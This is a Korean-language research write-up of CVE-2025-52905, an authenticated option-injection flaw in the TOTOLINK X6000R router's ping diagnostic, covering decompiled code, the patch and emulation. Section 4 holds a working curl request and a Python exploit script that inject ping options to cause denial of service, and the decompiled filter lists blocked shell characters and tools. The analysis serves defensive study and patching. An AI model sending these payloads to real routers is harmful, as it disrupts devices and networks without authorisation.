# CVE-2025-52905 분석 보고서

> **요약**: TOTOLINK X6000R 라우터의 웹 서버 바이너리(`/usr/sbin/shttpd`)에서 **입력값 검증 미흡** 취약점이 발견됨. `setDiagnosisCfg` API의 `ip` 파라미터에 대한 하이픈(`-`) 검증 부재로 **인증된 사용자**가 명령어 옵션 주입 가능. 본 문서는 펌웨어 역공학을 통한 취약 바이너리 추적, IDA Pro 정적 분석, QEMU 에뮬레이션, PoC 재현을 체계적으로 정리한다.

---

## 1. 취약점 소개

### 1.1 개요

| 항목 | 내용 |
|---|---|
| 취약점 명칭 | CVE-2025-52905 |
| 취약 유형 | 입력값 검증 미흡 *(CWE-20)* |
| 심각도 (CVSS) | 7.0 / HIGH |
| 공격 조건 | 불완전한 입력값 삭제 메커니즘을 통한 악성 인수 삽입 / **인증 필요 (Authenticated)** |
| 발생 위치 | `/usr/sbin/shttpd` 바이너리 (setDiagnosisCfg 함수) |
| PoC 공개 여부 | 없음 *(본 문서의 PoC는 연구 재현용)* |

### 1.2 영향 범위

| 제품 | 영향 받는 펌웨어 버전 |
|---|---|
| **TOTOLINK X6000R** | **V9.4.0cu.1360_B20241207 이하** |

### 1.3 테스트 이미지

- **취약 버전**: V9.4.0cu.1360_B20241207  
  링크: <https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html>

- **패치 버전**: V9.4.0cu.1498_B20250826  
  링크: <https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html>

---

## 2. 정적 분석

### 2.1 펌웨어 구조 (SquashFS 루트)

```bash
squashfs-root/
├── bin/
│   └── busybox            # shell
├── etc/
├── sbin/
├── usr/
│   └── sbin/
│       └── shttpd        # 취약점이 존재하는 웹 서버 바이너리
├── web/                  # 웹 서버 루트 디렉터리
│   ├── advance/
│   │   └── diagnosis.html # 사용자 인터페이스 코드
│   └── static/
│       └── js/
│           └── topicurl.js # API 호출 경로
└── www/
```

### 2.2 펌웨어 추출

다운로드 받은 zip 파일을 풀어 `.web` 파일을 `binwalk`로 추출한다.

```bash
binwalk -Me TOTOLINK_C8380R_X6000R_IP04499_MT7981_SPI_16M256M_V9.4.0cu.1360_B20241207_ALL.web
```

### 2.3 Root Cause 발견 과정

#### 2.3.1 공개된 정보

| 항목 | 내용 |
|---|---|
| 취약 함수 | `setDiagnosisCfg` |
| 원인 | 하이픈(`-`) 필터링 실패로 인한 명령어 옵션 주입 |
| 인증 여부 | 인증 필요 (Authenticated) |

참고 사이트:
- <https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/>
- <https://github.com/PaloAltoNetworks/u42-vulnerability-disclosures/blob/main/2025/PANW-20250001/PANW-2025-0001.md>

#### 2.3.2 취약 함수 위치 파악

**함수 설명**:
`setDiagnosisCfg` 함수는 라우터 등의 장치에서 진단 또는 설정 관련 기능을 처리하는 역할로, 주로 웹 인터페이스를 통해 설정 값을 변경할 때 사용한다.

**가설**:
웹 서버 바이너리나 관련 스크립트에 포함되어 있을 가능성이 높다.

**탐색**:
```bash
grep -r "setDiagnosisCfg" web/
grep -r "setDiagnosisCfg" usr/sbin
```

**발견**:
1. `web/advance/diagnosis.html` - 프론트엔드 UI 코드
2. `web/static/js/topicurl.js` - API 호출 경로
3. `usr/sbin/shttpd` - 백엔드 바이너리 (취약점 위치)

#### 2.3.3 diagnosis.html

`web/advance/diagnosis.html`은 진단 페이지의 사용자 인터페이스 코드로, 사용자가 입력한 `pingAddr` (IP 주소/도메인)과 `num` (핑 횟수)를 모아서 `uiPost.setDiagnosisCfg(n)`를 호출한다.

#### 2.3.4 topicurl.js (엔드포인트 식별)

`web/static/js/topicurl.js`에서:
- `setDiagnosisCfg`가 POST 요청의 `topicurl`로 정의됨
- 모든 API 요청이 `globalConfig.cgiUrl`로 전송됨

`web/static/js/config.js`에서 확인:
```javascript
globalConfig.cgiUrl: "/cgi-bin/cstecgi.cgi"
```

**결론**: 모든 API 호출이 `/cgi-bin/cstecgi.cgi` 단일 엔드포인트로 향하고, JSON의 `topicurl` 필드가 내부 라우팅을 결정하는 단일 게이트웨이 패턴을 따른다.

**인증 요구사항**: `autoLogout()` 함수가 포함되어 있어, 모든 API 호출 전에 유효한 인증 토큰이 필요함을 확인.

#### 2.3.5 usr/sbin/shttpd

웹 서버 바이너리인 `/usr/sbin/shttpd` 내부에 `setDiagnosisCfg`를 처리하는 실제 함수 코드가 존재함을 확인.

### 2.4 shttpd 소스 코드 분석

#### 2.4.1 문자열 우회 접근

취약 함수 문자열을 직접 검색했으나 유의미한 참조값을 찾을 수 없었다. 네트워크 진단의 기본 명령어인 `ping` 문자열을 검색하여 `sub_41666C`, `sub_417FC4` 두 함수를 발견.

#### 2.4.1 sub_41666C

```c
__int64 __fastcall sub_41666C(__int64 a1, __int64 a2)
{
    CsteSystem("rm -f /var/log/pingCheck", 0LL);
    Uci_Set_Str(11LL, "main", "ping_url", "");
    Uci_Set_Str(11LL, "main", "ping_num", "");
    Uci_Commit(11LL);
    sub_40C0C0(a2, 1LL, "", 0LL, "0", "reserv");
    return 0LL;
}
```

이 함수는 로그 파일을 삭제하고 설정을 초기화하는 역할로, 진단 중지 요청을 처리하는 함수임을 확인.

#### 2.4.2 sub_417FC4

```c
__int64 __fastcall sub_417FC4(__int64 a1, __int64 a2)
{
    const char *v4; // x21
    const char *v5; // x23
    int v6; // w20
    char s[256]; // [xsp+48h] [xbp+48h] BYREF
    
    memset(s, 0, sizeof(s));
    v4 = (const char *)sub_40C08C(a1, "ip");
    v5 = (const char *)sub_40C08C(a1, "num");
    v6 = atoi(v5);
    
    if ( (unsigned int)sub_417CB4(v4) )
        return 1LL;
        
    if ( (unsigned int)(snprintf(s, 0x100uLL, "ping %s -w %d &>/var/log/pingCheck", v4, v6) + 1) > 0x100 )
        __break(0x3E8u);
        
    CsteSystem(s, 0LL);
    Uci_Set_Str(11LL, "main", "ping_url", v4);
    Uci_Set_Str(11LL, "main", "ping_num", v5);
    Uci_Commit(11LL);
    sub_40C0C0(a2, 1LL, "", 0LL, "0", "reserv");
    return 0LL;
}
```

**핵심 동작**:
1. `v4` 변수에 사용자 입력 파라미터 `ip` 값 저장
2. `v5` 변수에 사용자 입력 파라미터 `num` 값 저장
3. `v4` (ip주소)에 대해 `sub_417CB4` 검증 함수 호출
4. **명령어 구성**: 사용자 입력 `v4`가 포맷 문자열 `%s`에 직접 삽입됨

#### 2.4.3 sub_417CB4 (취약 함수)

```c
bool __fastcall sub_417CB4(const char *a1)
{
    return strchr(a1, 59)           // ';'
        || strstr(a1, ".sh")
        || strstr(a1, "iptables")
        || strstr(a1, "telnetd")
        || strchr(a1, 38)           // '&'
        || strchr(a1, 124)          // '|'
        || strchr(a1, 96)           // '`'
        || strchr(a1, 36)           // '$'
        || strchr(a1, 10) != 0LL;   // '\n'
}
```

**취약점**: 사용자 입력 문자열(IP 주소)에 대해 위험한 특수 문자를 검사하지만, **하이픈(`-`)에 대한 검사가 누락**되어 있음.

검사 대상: `;`, `&`, `|`, `` ` ``, `$`, `\n`, `.sh`, `iptables`, `telnetd`

**공격 시나리오**: 공격자가 `ping -c 4 -s 65500 127.0.0.1` 형태로 입력하면, `-s 65500` 옵션이 필터링되지 않아 ping 패킷 크기를 65500 바이트로 설정하는 DoS 공격이 가능.

### 2.5 패치 코드 확인

#### 2.5.1 sub_416FF4 (패치된 버전)

```c
__int64 __fastcall sub_416FF4(__int64 a1, __int64 a2)
{
    __int64 v4; // x23
    const char *v5; // x22
    unsigned int v7; // w0
    __int64 v8; // x4
    char s[256]; // [xsp+48h] [xbp+48h] BYREF
    
    memset(s, 0, sizeof(s));
    v4 = sub_40C404(a1, "ip");
    v5 = (const char *)sub_40C404(a1, "num");
    
    if ( (unsigned int)is_cmd_string_valid(v4) && (unsigned int)is_only_number(v5) )
    {
        v7 = atoi(v5);
        if ( v7 >= 0x3D )
            v8 = 5LL;
        else
            v8 = v7;
        snprintf(s, 0x100uLL, "ping %s -w %d &>/var/log/pingCheck", v4, v8);
        CsteSystem(s, 0LL);
        Uci_Set_Str(11LL, "main", "ping_url", v4);
        Uci_Set_Str(11LL, "main", "ping_num", v5);
        Uci_Commit(11LL);
        sub_40C438(a2, 1LL, "", 0LL, "0", "reserv");
        return 0LL;
    }
    else
    {
        sub_40C438(a2, 0LL, "Error", 0LL, "0", "Parameter Error");
        return 1LL;
    }
}
```

**주요 변경 사항**:

1. **검증 로직 통합 및 강화**: 
   - 취약 버전: `if ( (unsigned int)sub_417CB4(v4) )`
   - 패치 버전: `if ( (unsigned int)is_cmd_string_valid(v4) && (unsigned int)is_only_number(v5) )`
   - `ip`와 `num` 모두에 대한 검증을 하나의 조건문으로 통합
   - 새로운 검증 함수 사용: `is_cmd_string_valid`, `is_only_number`

#### 2.5.2 추가 패치 사항

**ping 횟수 제한**:
```c
v7 = atoi(v5);
if ( v7 >= 0x3D )  // 61 이상이면
    v8 = 5LL;       // 5로 제한
else
    v8 = v7;
```

사용자 입력 ping 횟수가 61(0x3D) 이상이면 실제로 사용되는 횟수는 5로 제한하여, 공격자가 과도하게 긴 시간 ping을 실행시켜 Local DoS를 유발하는 것을 방지.

---

## 3. 에뮬레이션 (QEMU User-mode)

### 3.1 qemu-aarch64-static 주입

```bash
sudo cp $(which qemu-aarch64-static) ./usr/bin/
```

### 3.2 mount 설정 및 chroot로 진입

```bash
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
sudo mount --bind /sys ./sys

sudo rm ./var
sudo mkdir -p ./var/run

sudo chroot . ./usr/bin/qemu-aarch64-static /bin/sh
```

### 3.3 웹 서버 실행

```bash
# chroot 내부에서
ubusd &
/usr/sbin/shttpd -root /web
```

> **참고**: 실제 라우터 환경과 유사하게 구성하려면 추가 설정 필요 (uci, network 등)

---

## 4. Exploit (연구 재현용)

### 4.1 PoC

해당 PoC는 관리자 권한으로 인증된 후, `ip` 파라미터에 하이픈(`-`)으로 시작하는 명령행 옵션을 주입하여 라우터의 ping 명령어를 변질시키고, 시스템 리소스를 고갈시키는 서비스 거부(DoS)를 유발한다.

| 필드 | 값 | 설명 |
|---|---|---|
| topicurl | "setDiagnosisCfg" | 호출할 취약 API 함수명 |
| ip | "127.0.0.1 -c 99999999" | 취약 파라미터. IP 주소 뒤에 하이픈(-)으로 시작하는 ping 옵션 주입 (DoS 목표) |
| num | "1" | ping 횟수. 필수 파라미터 |

#### 4.1.1 curl을 이용한 공격

```bash
curl 'http://<ROUTER_IP>/cgi-bin/cstecgi.cgi?token=<TOKEN>' \
  -H 'Content-Type: application/json' \
  -X POST \
  --data-raw '{"topicurl":"setDiagnosisCfg","ip":"127.0.0.1 -c 99999999","num":"1"}'
```

#### 4.1.2 Python PoC (exploit.py)

```python
#!/usr/bin/env python3
import requests
import argparse
import json

def exploit(target_ip, token, malicious_options):
    target_url = f"http://{target_ip}/cgi-bin/cstecgi.cgi?token={token}"
    
    headers = {"Content-Type": "application/json"}
    
    data = {
        "topicurl": "setDiagnosisCfg",
        "ip": f"127.0.0.1 {malicious_options}",
        "num": "1"
    }
    
    response = requests.post(target_url, headers=headers, 
                           data=json.dumps(data), timeout=10)
    
    if response.status_code == 200:
        print("[+] 공격 성공!")
        print(f"[*] 옵션 '{malicious_options}' 주입 완료")
    else:
        print(f"[-] 공격 실패: {response.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-52905 PoC")
    parser.add_argument("target_ip", help="타겟 라우터 IP")
    parser.add_argument("token", help="인증 토큰")
    parser.add_argument("options", help="주입할 ping 옵션 (예: -c 99999999)")
    args = parser.parse_args()
    
    exploit(args.target_ip, args.token, args.options)
```

**사용법**:
```bash
chmod +x exploit.py
./exploit.py 192.168.0.16 ABDE11290AC447A4 "-c 99999999"
```

### 4.2 공격 흐름 요약

#### 4.2.1 [클라이언트] 페이로드 생성 및 전송

1. **페이로드 생성**: 
   - `topicurl`: `"setDiagnosisCfg"` 지정
   - `ip`: `"127.0.0.1 -c 99999999"` - 하이픈으로 시작하는 옵션 주입
   - `num`: `"1"`

2. **요청 전송**:
   ```
   POST /cgi-bin/cstecgi.cgi?token=<TOKEN>
   Content-Type: application/json
   ```

#### 4.2.2 [서버] 요청 수신 및 처리

1. `/usr/sbin/shttpd`가 POST 요청 수신
2. JSON에서 `topicurl("setDiagnosisCfg")` 확인 후 핸들러 검색
3. `setDiagnosisCfg` 로직 함수 호출

#### 4.2.3 [서버] 취약 함수 실행 및 DoS 발생

1. `ip` 파라미터 값 `"127.0.0.1 -c 99999999"` 추출
2. `sub_417CB4` 검증 함수 호출 - **하이픈(`-`) 검증 누락으로 통과**
3. 명령어 구성: `ping 127.0.0.1 -c 99999999 -w 1 &>/var/log/pingCheck`
4. `CsteSystem`으로 쉘 실행 → **DoS 공격 성공**

---

## 5. 재현 체크리스트

- [ ] 펌웨어 추출 및 SquashFS 루트 준비
- [ ] `qemu-aarch64-static` 주입 완료
- [ ] `/dev`, `/proc`, `/sys` 마운트 완료
- [ ] chroot 진입 및 `ubusd`, `shttpd` 실행
- [ ] 대상 펌웨어가 **패치 이전**(V9.4.0cu.1360_B20241207 이하)임 확인
- [ ] 네트워크 격리 환경(로컬 랩) 구성
- [ ] 관리자 인증 토큰 획득
- [ ] PoC 테스트 수행 및 DoS 효과 확인

---

## 6. 완화 및 패치 요약

- **입력 검증 강화**: 
  - 새로운 검증 함수 도입: `is_cmd_string_valid`, `is_only_number`
  - 하이픈(`-`) 및 기타 명령어 옵션 주입 방지
- **횟수 제한**: ping 횟수를 최대 60회(0x3C)로 제한하여 DoS 완화
- **안전한 명령 실행**: 입력값에 대한 엄격한 화이트리스트 검증
- **운영 측면**: 
  - 최신 펌웨어 적용 (V9.4.0cu.1498_B20250826 이상)
  - 관리자 인터페이스 접근 제한
  - 강력한 관리자 비밀번호 사용

---

## 7. 참고 자료

- CVE Details: CVE-2025-52905
- TOTOLINK 공식 펌웨어: <https://www.totolink.net>
- Palo Alto Networks 보고서: <https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/>
- GitHub 취약점 공개: <https://github.com/PaloAltoNetworks/u42-vulnerability-disclosures/blob/main/2025/PANW-20250001/PANW-2025-0001.md>

---

> **주의**: 본 문서는 교육·연구 재현 목적이며, 패치 이전 기기에 대한 무단 테스트를 금한다. 모든 PoC는 **격리된 로컬 환경**에서만 사용한다.